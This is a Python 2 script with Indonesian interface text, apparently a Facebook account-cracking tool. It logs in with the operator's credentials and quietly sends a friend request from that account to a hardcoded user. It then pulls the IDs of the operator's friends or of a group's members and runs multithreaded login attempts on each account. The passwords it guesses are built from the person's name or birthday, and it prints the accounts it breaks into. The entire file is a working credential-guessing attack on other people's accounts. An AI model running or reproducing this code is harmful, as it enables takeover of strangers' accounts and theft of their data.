import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\n\x1b[39;1m Thank You *_*'
    os.sys.exit()


def otw():
    print ' '
    os.system('clear')
    print '\n\x1b[1;39m[\x1b[31;1m!\x1b[39;1m] \x1b[31;1mKoneksi Terputus \x1b[1;39m[\x1b[31;1m!\x1b[39;1m]'
    print '\x1b[1;39m[\x1b[32;1m+\x1b[39;1m]\x1b[32;1mSilahkan Periksa Kembali Koneksi Internet Anda\x1b[1;39m[\x1b[32;1m+\x1b[39;1m]'
    print ' '
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


os.system('sh narget.sh')

def tik():
    titik = [
     '.   ', '..  ', '... ', '.... ', '.....', '......']
    for o in titik:
        print '\r\x1b[39;1m[\x1b[32;1m+\x1b[39;1m]\x1b[32;1mSedang Login\x1b[39;1m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        super()
    except (KeyError, IOError):
        os.system('clear')
        os.system('sh narget.sh')
        os.system('sh o.sh')
        print '\x00\x00\x00\x1b[34;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        id = raw_input('\x1b[1;39m[\x1b[32;1m+\x1b[39;1m]\x1b[1;35mGmail\x1b[31;1m/\x1b[35;1mNomor\x1b[1;91m:\x1b[1;39m ')
        print '\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
        print '\x00\x00\x00\x1b[34;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        pwd = raw_input('\x1b[1;39m[\x1b[32;1m+\x1b[39;1m]\x1b[1;35mPassword FB\x1b[1;91m:\x1b[1;39m ')
        print '\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
        print '\x00\x00\x00\x1b[34;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
            time.sleep(1)
            otw()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
                print '\n\x00\x00\x00\x1b[34;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
                print '\x1b[1;39m[\x1b[1;32m\xe2\x9c\x93\x1b[1;39m] \x1b[1;92mLogin Sucess'
                print '\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                super()
            except requests.exceptions.ConnectionError:
                otw()

        if 'checkpoint' in url:
            print '\n\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
            print ' '
            print '\n\x1b[39;1m[\x1b[31;1m!\x1b[39;1m]\x1b[33;1mSepertinya Akun Fb Anda Kena Checkpoint'
            print ' '
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
            print '\n\x00\x00\x00\x1b[34;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
            print '\x1b[39;1m[\x1b[31;1m!\x1b[39;1m]\x1b[33;1mLogin Gagal!!'
            print '\x00\x00\x00\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
            os.system('rm -rf login.txt')
            time.sleep(3)
            login()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    os.system('sh narget.sh')
    os.system('sh x.sh')
    pilih_super()


def pilih_super():
    print ' '
    print ' '
    peak = raw_input('\x1b[39;1m[\x1b[32;1m+\x1b[39;1m]\x1b[32;1mPilin No \x1b[31;1m:\x1b[39;1m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih_super()
    elif peak == '01':
        os.system('clear')
        os.system('sh narget.sh')
        jalan('\x1b[1;39m[\x1b[32;1m+\x1b[39;1m] \x1b[1;92mMengambil id teman \x1b[1;97m...')
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak == '200000000000':
        os.system('clear')
        os.system('sh narget.sh')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            super()

        re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
        s = json.loads(re.text)
        for i in s['data']:
            id.append(i['id'])

    elif peak == '00':
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;39m[\x1b[31;1m!\x1b[39;1m] \x1b[1;97m' + peak + ' \x1b[1;91mPilih Yang Benar'
        pilih_super()
    os.system('clear')
    os.system('sh v.sh')
    print '\x1b[39;1m[\x1b[32;1m+\x1b[39;1m] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;95m' + str(len(id))
    jalan('\x1b[1;39m[\x1b[32;1m+\x1b[39;1m] \x1b[1;92mLoading \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;39m[\x1b[32;1m+\x1b[39;1m] \x1b[1;92mMulai Mengakses Kemanan \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    os.system('sh b.sh')

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;39m[  \x1b[32;1mSucess \x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m] [\x1b[39;1m ' + pass1 + ' \x1b[31;1m]'
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;39m[\x1b[31;1mChekpoint\x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m]'
            else:
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;39m[  \x1b[32;1mSucess \x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m] [\x1b[39;1m ' + pass2 + ' \x1b[31;1m]'
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;39m[\x1b[31;1mChekpoint\x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m]'
                else:
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;39m[  \x1b[32;1mSucess \x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m] [\x1b[39;1m ' + pass3 + ' \x1b[31;1m]'
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;39m[\x1b[31;1mChekpoint\x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m]'
                    else:
                        lahir = b['birthday']
                        pass4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;39m[  \x1b[32;1mSucess \x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m] [\x1b[39;1m ' + pass4 + ' \x1b[31;1m]'
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;39m[\x1b[31;1mChekpoint\x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m]'
                        else:
                            pass5 = b['Sayang']
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;39m[  \x1b[32;1mSucess \x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user + ' \x1b[31;1m] [\x1b[39;1m ' + pass5 + ' \x1b[31;1m]'
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;39m[\x1b[31;1mChekpoint\x1b[39;1m] \x1b[31;1m[ \x1b[36;1m' + user
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;39m[\x1b[32;1m+\x1b[39;1m] \x1b[1;92mHack Fb Teman Sucess\x1b[39;1m *_*'
    raw_input('\n\x1b[39;1m[\x1b[32;1m+\x1b[39;1m]\x1b[32;1mKembali Lagi \x1b[31;1m[\x1b[34;1mY\x1b[31;1m/\x1b[34;1mT\x1b[31;1m] : \x1b[39;1m')
    super()


def get_userid(toket):
    url = 'https://graph.facebook.com/me?access_token=%s' % toket
    res = requests.get(url)
    uid = json.loads(res.text)
    return uid['id']


def gaz(toket, enable=True):
    id = get_userid(toket)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
    url = 'https://graph.facebook.com/graphql'
    res = requests.post(url, data=data, headers=headers)
    print res.text
    if '"is_shielded":true' in res.text:
        os.system('clear')
        os.system('sh narget.sh')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDiaktifkan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    elif '"is_shielded":false' in res.text:
        os.system('clear')
        os.system('sh narget.sh')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDinonaktifkan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        lain()
    else:
        print '\x1b[1;91m[!] Error'
        keluar()


if __name__ == '__main__':
    login()
